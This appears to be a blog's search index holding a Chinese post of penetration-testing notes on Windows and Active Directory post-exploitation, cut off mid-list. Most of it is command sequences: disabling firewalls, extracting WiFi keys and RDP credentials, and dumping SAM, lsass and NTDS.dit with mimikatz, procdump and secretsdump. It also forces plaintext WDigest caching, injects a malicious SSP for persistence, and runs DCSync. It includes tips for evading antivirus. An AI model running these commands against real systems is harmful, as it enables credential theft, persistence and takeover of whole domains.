<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>test</title>
      <link href="/2025/01/03/test/"/>
      <url>/2025/01/03/test/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>总之一堆乱七八糟的东西</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><h2 id="本地信息收集及基础操作"><a href="#本地信息收集及基础操作" class="headerlink" title="本地信息收集及基础操作"></a>本地信息收集及基础操作</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">ipconfig:收集本机 ip 信息，特别注意有双网卡的情况。</span><br><span class="line"></span><br><span class="line">systeminfo:收集主机名、操作系统版本，补丁信息</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PROCESSOR_ARCHITECTURE&quot;</span>:查看系统架构</span><br><span class="line"></span><br><span class="line">wmic product get name,version </span><br><span class="line">poweshell <span class="string">&quot;GET-WmiObject -class win32_product|Select-Object-Property name,version&quot;</span>:查看安装的软件及版本</span><br><span class="line"></span><br><span class="line">wmic service list brief:查看电脑运行的服务</span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> list brief </span><br><span class="line">tasklist /svc:查看电脑运行的进程（注意各类杀软、EDR 等安全软件 是否有数据库、代理、网络监控 zabix 等）</span><br><span class="line"></span><br><span class="line">wmic startup get command,caption:查看电脑启动项</span><br><span class="line"></span><br><span class="line">schtasks /query /fo LIST /v:查看计划任务，如果出现无法加载列资源的错误 输入:chcp <span class="number">437</span></span><br><span class="line"></span><br><span class="line">net statistics workstation:查看电脑开机时间</span><br><span class="line"></span><br><span class="line">wmic useraccount get name,sid</span><br><span class="line">net user:查看本地用户</span><br><span class="line"></span><br><span class="line">net session:查看会话情况</span><br><span class="line"></span><br><span class="line">netstat <span class="literal">-ano</span>:查询电脑端口开放信息和连接情况（可能会找到内网其他服务器 如数据</span><br><span class="line"></span><br><span class="line">库服务器）</span><br><span class="line"></span><br><span class="line">wmic /node:localhost /namespace:\\root\securitycenter2 path antiviruspr</span><br><span class="line">oduct get displayname /format:list:查询杀软</span><br><span class="line"></span><br><span class="line">wmic share get name,path,status</span><br><span class="line">net share:查看共享信息</span><br><span class="line"></span><br><span class="line">route print:查看路由信息</span><br><span class="line"></span><br><span class="line">netsh firewall show state:查看防火墙信息</span><br><span class="line"></span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode disable:关闭防火墙</span><br><span class="line"></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off:关闭防火墙（WS2003 之后才能使</span><br><span class="line"></span><br><span class="line">用该命令）</span><br><span class="line"></span><br><span class="line">cmdkey /l :查看 RDP 等凭据信息，如果存在可以破解拿到明文密码</span><br><span class="line"></span><br><span class="line">arp <span class="literal">-a</span> :查看 arp 信息 可能会泄露内网网段和 ip 地址等信息</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> %APPDATA%\Microsoft\Windows\Recent :查看最近打开的文件</span><br><span class="line"></span><br><span class="line">net localgroup :查看本地工作组</span><br><span class="line"></span><br><span class="line">net localgroup administrators ：查看组成员信息</span><br><span class="line"></span><br><span class="line">C:\Users\kzh\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine :powershell 历史命令</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>防火墙放行特定程序或端口，直接关闭防火墙动静太大</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2003</span> 及之前的版本，允许指定的程序进行全部的连接</span><br><span class="line"></span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe <span class="string">&quot;allownc&quot;</span> enable</span><br><span class="line"></span><br><span class="line"><span class="number">2003</span> 之后的版本，允许指定的程序进行全部的连接</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;pass nc&quot;</span><span class="built_in">dir</span>=<span class="keyword">in</span> action=allow program=<span class="string">&quot;C:\nc.exe&quot;</span></span><br><span class="line"></span><br><span class="line">允许指定程序退出，命令如下netsh advfirewall firewall add rule name=<span class="string">&quot;Allownc&quot;</span><span class="built_in">dir</span>=out action=allowprogram=<span class="string">&quot;C:\nc.exe&quot;</span></span><br><span class="line"></span><br><span class="line">允许 <span class="number">3389</span> 端口放行，命令如下</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;RemoteDesktop&quot;</span> protocol=TCP <span class="built_in">dir</span>=<span class="keyword">in</span> localport=<span class="number">3389</span> action=allow</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开启远程 3389</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v PortNumber 查看 RDP 端口(<span class="number">0</span>xd3d 为 <span class="number">3389</span>)</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f 开启</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">11111111</span> /f 关闭</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> /a %userprofile%\AppData\Local\Microsoft\Credentials\* :查看 RDP 凭据（可破解明文账号密码）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>wifi 相关:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查看连接过的 wifi 名称</span><br><span class="line">netsh wlan show profiles</span><br><span class="line"></span><br><span class="line">获取 wifi 名称为 xxx 的密码</span><br><span class="line">netsh wlan show profile name=<span class="string">&quot;xxx&quot;</span> key=<span class="built_in">clear</span></span><br><span class="line"></span><br><span class="line">查看所有 wifi 及密码</span><br><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;skip=9 tokens=1,2 delims=:&quot;</span> %i <span class="keyword">in</span> (<span class="string">&#x27;netsh wlan show profiles&#x27;</span>)<span class="keyword">do</span> @<span class="built_in">echo</span> %j | findstr <span class="literal">-i</span> <span class="literal">-v</span> <span class="built_in">echo</span> |netsh wlan show profiles %j key=<span class="built_in">clear</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">wmic useraccount</span><br></pre></td></tr></table></figure><p>whoami 可能出现的几种情况:</p><ul><li>本地用户:机器名</li><li>本地超管:机器名</li><li>域用户:域名域超管:域名<br>如果内网中存在域，只有本地超管(包括 system)和域内用户可以查询域内信息</li></ul><p>判断域是否存在<br>ipconfig &#x2F;all<br>systeminfo<br>net config workstation<br>net time &#x2F;domain</p><p>查询域内组&#x2F;组成员<br>net group &#x2F;domain<br>net gtoup “Domain Admins” &#x2F;domain</p><p>查询域内存活计算机<br>net view &#x2F;domain:域名</p><p>查询域内密码测策略<br>net accounts &#x2F;domai</p><p>定位域控(👍)</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nltest /dclist:域名</span><br><span class="line"></span><br><span class="line">nslookup <span class="literal">-type</span>=SRV _ldap._tcp</span><br><span class="line"></span><br><span class="line">nslookup 域名</span><br><span class="line"></span><br><span class="line">net time /domain</span><br><span class="line"></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Controllers&quot;</span> /domain:查看域控组中的机器</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> %LOGONSERVER%.%USERDNSDOMAIN%</span><br></pre></td></tr></table></figure><p>获取域内用户命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br><span class="line">net group &quot;组名&quot; /domain</span><br></pre></td></tr></table></figure><p>定位域管理员</p><p>原因：方便后续横向移动假设当前控制了一台域内主机，但是该主机上域管用户压根没有登录过。所以我们如果能找到域管理员在哪台电脑上登录过，该电脑就是首要攻击目标，结合密码抓取技术，可以轻易获取域管凭据。</p><p>PsLoggedon</p><p>该工具可以显示本地登录的用户和通过本地计算机或远程计算机的资源登录的用户。如果指定了用户名而不是计算机，psloggedon.exe 会搜索网络邻居中的计算机，并显示该用户当前是否已登录。</p><p>微软自带工具，杀软友好</p><p>首次使用需要输入 <code>psloggedon.exe -accepteula</code> 同意用户协议</p><p><code>psloggedon.exe \\computername or \\username</code></p><p>PVEFindADUser</p><p>pveFindADUser.exe 可用于查找 AD 用户登录的位置，枚举域用户，以及查找在特</p><p>定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务和</p><p>计划任务的用户账户。</p><p>pveFindADUser.exe -current 查看机器中当前登录的用户</p><p>-current “用户名” 显示该特定用户登录的计算机</p><p>-last 查看每台机器最后登录的用户</p><p>-last “用户名” 显示该特定用户最后登录的计算机</p><h2 id="密码获取"><a href="#密码获取" class="headerlink" title="密码获取"></a>密码获取</h2><p>转储读取的意思就是，将 SAM 文件转储到我们自己的电脑上然后使用工具读取<br>在一定程度上可以躲避杀软</p><p>导出 SAM 文件：<br><img src="https://i.imgur.com/hKYm43g.png"><br>reg 命令：</p><ul><li>reg save hklm\sam sam.hive</li><li>reg save hklm\system system.hive (解开 sam 文件的密钥也需要导出)<br>后续system.hive以相同方式执行</li></ul><p><img src="https://i.imgur.com/DI9YStV.png"><br>cs操作下载，然后下之后到cs的服务器端查看，这里是虚拟机环境，将其中的文件拿出来重名为sam.hive和sys.hive(这里注意不要弄混了)</p><p>本地解密操作<br><img src="https://i.imgur.com/yuG4KbE.png" alt="xx|450x250"><br>移动到本机mimikatz目录执行命令解密</p><ul><li>lsadump::sam &#x2F;sam:sam.hive &#x2F;system:sys.hive</li></ul><p>转储读取的意思就是，将 SAM 文件转储到我们自己的电脑上然后使用工具读取，在一定程度上可以躲避杀软</p><h3 id="读取-lsass-进程内存密码"><a href="#读取-lsass-进程内存密码" class="headerlink" title="读取 lsass 进程内存密码"></a>读取 lsass 进程内存密码</h3><p>使用工具直接读取 lsass 进程中的明文密码，工具可能被杀。privilege:debug</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa:msv 获取 HASH(LM,NTLM)</span><br><span class="line"></span><br><span class="line">sekurlsa:wdigest 通过可逆的方式去内存中读取明文密码</span><br><span class="line"></span><br><span class="line">sekurlsa:Kerberos 获取域管理员的明文密码</span><br><span class="line"></span><br><span class="line">sekurlsa::tspkg 通过 tspkg 读取明文密码</span><br><span class="line"></span><br><span class="line">sekurlsa:livessp 通过 livessp 读取明文密码</span><br><span class="line"></span><br><span class="line">sekurlsa:ssp 通过 ssp 读取明文密码</span><br><span class="line"></span><br><span class="line">sekurlsa:logonPasswords 通过以上各种方法读取明文密码</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/dS847Ty.gif"></p><h3 id="转储"><a href="#转储" class="headerlink" title="转储"></a>转储</h3><p>将 Isass 内存导出，在本地读取 Isass 内存中的明文账号密码。</p><p>转储内存方式有很多：</p><p>1、使用任务管理器直接转储</p><p>前提是能远程打开任务管理器，随后找到 lsass 进程右键转储即可。</p><p>2、procdump</p><p>使用 procdump 导出 Isass.dmp 文件，杀软比较友好。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/nuqXfpn.png"></p><p>使用mimikatz从转储的lsass.dmp中来读取明文密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span></span><br></pre></td></tr></table></figure><p>![[..&#x2F;附件管理&#x2F;动画26 1.gif]]</p><p>3、Out-MiniDump.ps1<br>项目地址-<a href="https://github.com/PowerShellMafia/PowerSploit">PowerShellMafia&#x2F;PowerSploit: PowerSploit - A PowerShell Post-Exploitation Framework</a></p><p>这里仅使用其中一个 ps 脚本，用法如下:</p><ul><li>powershell-import Out-MiniDump.ps1</li><li>powershell Get-Process lsass | Out-MiniDump<br><img src="https://i.imgur.com/HRWPYPn.png"></li></ul><p>4、comsvcs.dll</p><p>Windows 自带的动态链接库，可通过其函数 MiniDump 实现 dump 内存</p><p>使用方法：</p><p>查看进程 pid:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | findstr lsass.exe</span><br></pre></td></tr></table></figure><p>使用 powershell 导出:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 C:\Windows\system32\comsvcs.dll,MiniDump 488 C:\lsass.dmp full</span><br></pre></td></tr></table></figure><p>读取明文密码依旧使用 mimikatz：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::minidump 文件名&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意<br>某些 AV 可能会将使用 procdump.exe 转储 lsass.exe 的行为检测为恶意行为，这是因为它们检测到了字符串“procdump.exe”和“lsass.exe”。因此，将 lsass.exe 的 PID 作为参数传递给 procdump 比将名称 lsass.exe 作为参数传递更为隐蔽</p></blockquote><h3 id="高版本密码抓取"><a href="#高版本密码抓取" class="headerlink" title="高版本密码抓取"></a>高版本密码抓取</h3><p>Win7 和 Win2008 这样的机器中会存储明文密码至内存中，但是在 WS2012 之后的(win8&#x2F;10&#x2F;11,WS2012&#x2F;2016)或者安装了补丁 KB2971997 补丁的机器中内存中不再存储明文密码，无法通过上述手段抓取明文密码。</p><p><img src="https://i.imgur.com/4NMr876.png"></p><h3 id="修改-Wdigest-注册表"><a href="#修改-Wdigest-注册表" class="headerlink" title="修改 Wdigest 注册表"></a>修改 Wdigest 注册表</h3><p>在 Windows2012 系统及以上的系统，默认在内存缓存中禁止保存明文密码的。可以&#x3D;&#x3D;通过修改注册表的方式抓取明文&#x3D;&#x3D;，需要&#x3D;&#x3D;用户重新登录后才能成功抓取&#x3D;&#x3D;。</p><p>查询是否存在该值，默认情况下不存在 UseLogonCredential 值</p><p><img src="https://i.imgur.com/8A2TJoz.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&quot; /V UseLogonCredential</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/B9FtUiz.png" alt="x|900x250"></p><p>使用最高管理员权限添加 UseLogonCredential 并赋值为 1，使内存中保存明文密码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/wL2qzTd.png" alt="x|900x150"><br>添加该值并且赋值为 1，如下效果即可。<br><img src="https://i.imgur.com/GUdSRnQ.png"></p><p>现在内存中会保存明文密码了，但是当前内存中没有，需要锁屏或者注销用户，让用户重新登陆之后才有。</p><p>锁屏(用这种方式抓不到 win10 的密码 最好注销用户)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure><p>查询在线用户:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quser</span><br></pre></td></tr></table></figure><p>注销用户:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logoff ID</span><br></pre></td></tr></table></figure><p>之后再次登录再查询<br><img src="https://i.imgur.com/MmmDM5l.png"></p><p>关闭:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><h3 id="内存注入-SSP"><a href="#内存注入-SSP" class="headerlink" title="内存注入 SSP"></a>内存注入 SSP</h3><p>Mimikatz 中，有写好的恶意的 SSP,可以提供本地认证时候对明文账号密码进行记录，只需要将 SSP 注入到系统内存中，就可以获取本地的明文账号密码，因为是注入内存所以重启后就失效了，这个攻击也叫 SSP 注入。</p><p>方法 1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz:</span><br><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/fYAAgEm.png"></p><p>方法 2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\InvokeMimikatz.ps1</span><br><span class="line"></span><br><span class="line">Invoke-Mimikatz-Command &quot;misc::memssp&quot;</span><br></pre></td></tr></table></figure><p>同样需要注销用户。用户重新登录之后在 C:\System32\ 目录下会存在 mimilsa.log 文件，记录明文密码。在 CS 上可能会没有权限查看这个文件(system 也没用),此时需要使用计划任务将该文件,换个位置，或者发送到 VPS。</p><p>创建 bat 文件，用于复制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell echo copy C:\Windows\System32\mimilsa.log C:\Users\Administrator\Desktop\1.txt &gt;1.bat</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/arYznKP.png"></p><p>创建计划任务，执行 bat 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /create /tn copy /sc onstart /tr C:\Users\Administrator\Desktop\1.bat /ru system /f</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Z8zrS0T.png"></p><p>运行计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /run /i /tn &quot;copy&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/HgdZwSf.png"></p><p>一定要创建计划任务，直接在 CS 运行这个 bat 文件不行。</p><h3 id="注册表添加-SSP"><a href="#注册表添加-SSP" class="headerlink" title="注册表添加 SSP"></a>注册表添加 SSP</h3><p>SSP 注入到内存中，有一个弊端就是在内存中，只要电脑重启了就会失效，如果想要永久生效就需要将 SSP 添加到注册表中，之后系统重启就会加载 SSP,这样就会获取明文账号密码。</p><p>1、在 Mimikatz 中有一个 mimilib.dll 文件，这个就是 SSP，将这个文件复制到 C:\Windows\System32 目录下</p><p>2、修改注册表，使得重新启动时加载 SSP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v &quot;Security Packages&quot; /t REG_MULTI_SZ /d mimilib.dll /f</span><br></pre></td></tr></table></figure><p>3、密码将会生成在 C:\Windows\System32\kiwissp.log</p><p>小问题:这个 dll 会被杀软杀掉</p><h1 id="域控密码抓取"><a href="#域控密码抓取" class="headerlink" title="域控密码抓取"></a>域控密码抓取</h1><h2 id="NTDS-文件介绍"><a href="#NTDS-文件介绍" class="headerlink" title="NTDS 文件介绍"></a>NTDS 文件介绍</h2><p>Active Directory 目录服务使用数据存储来存储所有目录信息。此数据存储通常称为目录。目录包含有关用户、组、计算机、域、组织单位和安全策略等对象的信息。这些信息可以发布以供用户和管理员使用。</p><p>目录存储在域控制器上，可以由网络应用程序或服务访问。一个域可以有一个或多个域控制器。每个域控制器都有其所在整个域的目录副本。对一个域控制器上的目录所做的更改将复制到域、域树或林中的其他域控制器。Active Directory 使用四种不同的目录分区类型来存储和复制不同类型的数据。目录分区包含域、配置、架构和应用程序数据。此存储和复制设计为整个域中的用户和管理员提供目录信息。</p><p>目录数据存储在域控制器上的 Ntds.dit 文件中。建议将此文件存储在 NTFS 分区上。有关用于管理 Active Directory 数据库和日志文件的工具的详细信息，请参阅Ntdsutil 中的文件。私有数据以安全方式存储，公共目录数据存储在共享系统卷上，可从中复制到域中的其他域控制器。有关复制的详细信息，请参阅复制概述。域控上的 ntds.dit 只有可以登录到域控的用户（如域管用户、DC 本地管理员用户）可以访问，为了进一步保护密码哈希值，使用存储在 SYSTEM 注册表配置单元中的密钥对这些哈希值进行加密。<br>该文件的位置:C:（域控上才有这个文件夹）</p><h3 id="卷影拷贝提取域控-NTDS"><a href="#卷影拷贝提取域控-NTDS" class="headerlink" title="卷影拷贝提取域控 NTDS"></a>卷影拷贝提取域控 NTDS</h3><p>从 Windows XP SP2 和 Windows Server2003 开始，微软就向 Windows 操作系统中引入了一项名叫卷影拷贝的服务(Volume Shadow Copy Service-VSS)。</p><p>这种服务允许 Windows 系统以自动或手动的方式对文件或磁盘卷宗的当前状态进行备份（或快照），需要注意的是，在这个过程中，&#x3D;&#x3D;即使文件处于打开状态下<br>该服务仍然可以直接进行文件备份&#x3D;&#x3D;，</p><p>Ntds.dit 是默认被 Windows 系统锁定的，想要读取该文件就要利用卷影拷贝服务(Volume Shadow Copy Service,VSS),得到 Ntds.dit 文件的副本。卷影拷贝服务(VSS)本质上是属于快照技术的一种主要用于备份和恢复，即使目标文件被处于锁定状态。</p><p>方式一:ntdlutils.exe</p><p>ntdsutil..exe 是一个为活动目录提供管理机制的命令行工具，该工具默认安装在域控服务器上，可以在域控制器上直接操作，2003、2008、2012、2016 等，提取 NTDS 过程分为 3 步。如果使用 CS，必须有 SYSTEM 权限。</p><p>创建快照:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe snapshot &quot;activate instance ntds&quot; create q q</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/2QQpneO.png"></p><p>加载快照到磁盘中:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe snapshot &quot;mount 26e87b74-3c6f-46ea-9994-c85f9cf93b42&quot; q q</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/zsjJUbn.png"></p><p>复制 NTDS 文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202411041725_VOLUMEC$\Windows\NTDS\ntds.dit C:\Users\kzh\Desktop\ntds.dit</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/UqlwhNV.png"></p><p>移除挂载，删除快照:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe snapshot &quot;unmount &#123;26e87b74-3c6f-46ea-9994-c85f9cf93b42&#125;&quot; &quot;delete &#123;26e87b74-3c6f-46ea-9994-c85f9cf93b42&#125;&quot; q q</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/5paDsXN.png"></p><p>生成dit文件<br><img src="https://i.imgur.com/OQfSBtx.png"></p><h3 id="离线读取-NTDS"><a href="#离线读取-NTDS" class="headerlink" title="离线读取 NTDS"></a>离线读取 NTDS</h3><p>首先需要下载 NTDS 文件，而且还要转储 system.hive,和 sam 文件一样，需要 system.hive 中的密钥才能读取 NTDS 文件。</p><p>reg save hklm\system1 c:\windows\temp\system.hive</p><p>有了这两个文件之后就可以使用工具读取了：</p><p>secretsdump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.exe -system sys.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure><p>NTDSDumpEx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTDSDumpEx -d ndts.dit -s sys.hive -o 1.txt</span><br></pre></td></tr></table></figure><p>只有账户 hash 值,还有很多方式和工具支持，顺手即可。</p><h3 id="在线读取-NTDS"><a href="#在线读取-NTDS" class="headerlink" title="在线读取 NTDS"></a>在线读取 NTDS</h3><p>直接用工具读取 NTDS 文件，但是可能会被杀软杀，而且因为域内可能用户较多导致文件大，如果网络不好可能会出问题。</p><p>mimikatz:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync/domain:abc.com /all /csv (读取所有)</span><br><span class="line">lsadump::dcsync/domain:abc.com /user:administrator (读取指定用户)</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/DLeJLvQ.png"></p><p>QuarksPWDump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarksPWDump.exe --dump-hash-domain --ntds-file ntds.dit</span><br></pre></td></tr></table></figure><p>首先需要导出 ntds.dit 文件</p><h2 id="Dcsync-原理及攻击"><a href="#Dcsync-原理及攻击" class="headerlink" title="Dcsync 原理及攻击"></a>Dcsync 原理及攻击</h2><p>Dcsync(domain Controler synchronization):在内网中一般不是一个域控，会有域树或者域森林等，域控之间是要同步数据的，不同的域控 15 分钟之间要发起一次数据同步的请求，请求里面就包含同步的数据，这里采用的协议是 DRS(目录复制服务)，这个就是 DCsync。</p><p>2015 年 8 月，新版本的 Mimikatz,新增加了 DCSync 功能。该功能可以模仿一个域控制器，从真实的域控制器中请求数据，例如用户的哈希。该功能最大的特点就是不用登陆域控制器，即可远程通过域数据同步复制的方式获得域控制器上的的数据。这种攻击就叫做 DCsync 攻击。</p><p>关于 Dcsync 的利用思路</p><p>1、找到有权限的用户，从而远程读取域控用户信息，可以进行 PTH、黄金白银票据攻击</p><p>2、如果控制了域控，可以在域控添加一个管理员账号从而进行权限维持</p><p>3、可以添加一个普通的用户，修改 ACL 从而实现可以使用 Dcsync,进行权限维持。以下用户可以运行 DRS 服务：</p><ul><li>1.Administrators 